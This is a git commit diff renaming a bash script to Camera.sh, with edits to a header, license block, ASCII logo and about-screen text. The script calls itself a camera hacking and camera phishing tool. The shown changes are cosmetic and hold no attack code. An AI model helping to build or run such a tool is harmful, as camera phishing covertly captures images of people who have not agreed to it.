b463acbb4b38de6ed7440adb951db33cf29975a6
ANONYMOUS U7P4L <123867620+ANONYMOUS-U7P4L@users.noreply.github.com>
2023-02-05 19:47:12 +0600

    Update and rename Cam.sh to Camera.sh

--- Camera.sh
+++ Camera.sh
@@ -1,13 +1,34 @@
 #!/bin/bash
 
-
-: '
 #--------------------INFO-------------------#
 #CODING U7P4L
-#SCRIPT Camra Hacking Command 
+#SCRIPT camra hacking
 #FACEBOOK > ANONYMOUS U7P4L 
 #GITHUB > ANONYMOUS-U7P4L 
 #-------------MAIN>MENU-------------#
+
+: '
+MIT License
+
+Copyright (c) 2022 U7P4L
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
 '
 
 
@@ -40,11 +61,11 @@ tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
-${green}  ____                _   _            _
-${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
-${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
-${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
-${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
+${green} ██████  █████  ███    ███ ██████   █████        ██   ██  █████   ██████ ██   ██ ███████ ██████  
+${red} ██      ██   ██ ████  ████ ██   ██ ██   ██       ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
+${cyan}██      ███████ ██ ████ ██ ██████  ███████ █████ ███████ ███████ ██      █████   █████   ██████  
+${purple}██      ██   ██ ██  ██  ██ ██   ██ ██   ██       ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
+${yellow}  ██████ ██   ██ ██      ██ ██   ██ ██   ██       ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██ 
 ${red}                                            [v${version}]
 ${blue}                                    [BY ANONYMOUS U7P4L]
 "
@@ -522,12 +543,12 @@ fi
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[Camra-Hacker]
+        echo -e "$red[ToolName]  ${cyan}  :[CamraHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
 $red[Author]     ${cyan} :[U7P4L]
 $red[Github]     ${cyan} :[https://github.com/ANONYMOUS-U7P4L]
-$red[Messenger]  ${cyan} :[https://m.me/ANONYMOUS]
+$red[Messenger]  ${cyan} :[https://m.me/loser]
 $red[Email]      ${cyan} :[badid690@gmail.com]"
         printf "$ch_prompt"
         read about
